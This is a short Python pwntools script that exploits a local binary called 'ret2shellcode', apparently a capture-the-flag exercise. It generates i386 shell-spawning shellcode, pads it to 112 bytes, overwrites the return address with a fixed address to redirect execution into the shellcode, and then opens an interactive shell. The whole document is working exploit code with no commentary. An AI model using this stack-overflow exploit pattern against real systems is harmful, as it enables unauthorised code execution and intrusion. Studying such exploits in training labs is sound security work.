from pwn import *

p=process('./ret2shellcode')

context(arch = 'i386',os = 'linux')

shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(112,'a') + p32(0x804a080)

p.sendline(payload)

p.interactive()